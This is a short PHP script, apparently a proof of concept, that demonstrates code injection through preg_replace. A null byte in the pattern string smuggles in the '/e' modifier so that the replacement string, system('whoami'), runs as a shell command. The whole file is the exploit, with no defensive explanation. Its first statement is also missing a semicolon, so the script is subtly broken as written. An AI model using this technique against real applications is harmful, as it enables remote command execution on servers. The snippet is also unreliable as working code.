<?php
$searchStr = 'This is a test string.'
// Without Null Character
  //$toReplace = "test/e";
// The upper won't work
  
$toReplace = "test/e\0";

$replaceWith = "system('whoami')";

echo preg_replace('/'.$toReplace.'/', $replaceWith, $searchStr);
?>
